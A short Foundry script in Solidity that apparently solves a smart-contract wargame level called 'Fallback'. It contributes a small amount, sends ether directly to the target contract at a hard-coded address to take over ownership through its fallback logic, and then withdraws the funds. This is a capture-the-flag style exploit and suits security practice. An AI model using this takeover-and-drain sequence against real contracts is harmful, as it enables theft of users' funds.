// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script, console} from "../lib/forge-std/src/Script.sol";
import {Fallback} from "../src/Fallback.sol";

contract FallbackScript is Script {
    Fallback public fallbackContract;

    function run() external {
        interactions();
    }

    function interactions() public {
        fallbackContract = Fallback(
            payable(0x6D95D38b06102f48D9346B2976aDE47e49b8A226)
        );
        vm.startBroadcast();
        fallbackContract.contribute{value: 0.0001 ether}();
        (bool success, ) = address(fallbackContract).call{value: 0.0001 ether}(
            ""
        );
        console.log(success);
        fallbackContract.withdraw();
        vm.stopBroadcast();
    }
}
